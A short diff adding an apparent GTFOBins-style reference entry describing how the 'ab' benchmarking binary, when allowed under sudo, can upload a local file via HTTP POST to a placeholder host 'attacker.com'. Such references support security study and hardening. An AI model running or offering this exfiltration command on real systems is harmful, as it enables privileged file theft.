@@ -1,0 +1,8 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * Upload local file via HTTP POST request.
+      URL=http://attacker.com/
+      LFILE=file_to_send
+      sudo ab -p $LFILE $URL
